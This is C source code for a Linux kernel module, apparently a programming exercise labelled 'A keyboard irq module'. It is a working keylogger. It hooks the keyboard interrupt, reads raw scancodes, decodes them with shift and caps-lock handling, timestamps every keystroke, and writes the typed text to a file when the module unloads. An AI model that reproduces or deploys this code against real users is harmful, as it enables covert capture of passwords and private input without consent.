#include "keylog.h"
#include "keymap.h"
#include "misc_stats.c"
#include "misc_keylog.c"

static void fill_stroke(struct s_stroke *new, struct s_keyboard_map *entry,
		        struct timespec ts, unsigned char scancode)

{
	new->key =  scancode & 0x7f;
	entry = &keyboard_mapping[new->key];
	new->name =  entry->str;
	new->state = (scancode & 0x80) ? RELEASED : PRESSED;
	entry->pressed = new->state == PRESSED ? true : false;
	if (entry->pressed)
		entry->nb_pressed += 1;
	else
		entry->nb_released += 1;
	caps_lock = entry->pressed && new->key == CAPS_LOCK ? !caps_lock : caps_lock;
	shift = keyboard_mapping[SHIFT_R].pressed | keyboard_mapping[SHIFT_L].pressed;
	if (isalpha(entry->ascii))
		new->value = shift == caps_lock ? entry->ascii : entry->shift_ascii; 
	else
		new->value = shift ? entry->shift_ascii : entry->ascii; 
	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
	list_add(&new->stroke_lst, &head_stroke_lst);

}
static irqreturn_t keyboard_handler (int irq, void *dev_id)
{
	struct s_stroke		*new;
	struct timespec ts;
	struct s_keyboard_map	*entry;
	static unsigned char scancode;

	getnstimeofday(&ts);
	spin_lock(&mr_lock);
	scancode = inb (0x60);
	spin_unlock(&mr_lock);
	new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC);
	if (new) 
		fill_stroke(new, entry, ts, scancode);
	return IRQ_HANDLED;
}

static int __init keyboard_irq_init(void)
{
	int ret;

	ret = misc_register(&keylog_dev);
	if (ret < 0) 
		return -ENOMEM;
	ret = misc_register(&stats_dev);
	if (ret < 0) 
		return -ENOMEM;
	ret = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
			"keyboard", (void *)keyboard_handler);
	if (ret) {
		pr_err("can't get shared interrupt for keyboard\n");
		return -1;
	}
	printk (KERN_ERR "init okay!\n");
	return 0;
}


static void write_file(struct file *filp)
{
	char			*output;
	struct s_stroke		*strokes = NULL;
	unsigned long long offset = 0;
	mm_segment_t oldfs;
	int ret;

	vfs_write_type	vfs_write =
		(void *)kallsyms_lookup_name("vfs_write");
	
	oldfs = get_fs();
	set_fs(get_ds());
	output = kmalloc(BUF_SIZE, GFP_KERNEL);
	memset(output, 0, PAGE_SIZE);
	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		if (strokes->state == PRESSED &&
		    (isprint(strokes->value) || strokes->value == 13))
				output[strlen(output)] = strokes->value == 13 ? '\n' : strokes->value;
		kfree(strokes);
	}
	ret = vfs_write(filp, output, strlen(output), &offset);
	set_fs(oldfs);
	filp_close(filp, NULL);
	kfree(output);
}

struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

static void __exit keyboard_irq_exit(void)
{
	struct file *		filp = NULL;

	filp = file_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  	if (filp)
		write_file(filp);
//	if (keylog_dev)
		misc_deregister(&keylog_dev);
//	if (stats_dev)
		misc_deregister(&stats_dev);
	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("abonneca");
MODULE_DESCRIPTION("A keyboard irq module");

module_init(keyboard_irq_init);
module_exit(keyboard_irq_exit);
